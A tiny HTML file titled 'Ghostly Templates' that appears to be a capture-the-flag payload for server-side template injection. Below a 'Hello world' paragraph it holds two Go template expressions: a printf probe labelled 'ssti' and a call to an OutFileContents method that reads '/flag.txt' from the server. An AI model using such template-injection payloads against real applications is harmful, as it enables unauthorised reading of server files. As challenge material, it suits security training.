<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Ghostly Templates</title>
  </head>
  <body>
    <p>Hello world</p>
    {{ printf "%s" "ssti" }}
    {{ .OutFileContents "/flag.txt" }}
  </body>
</html>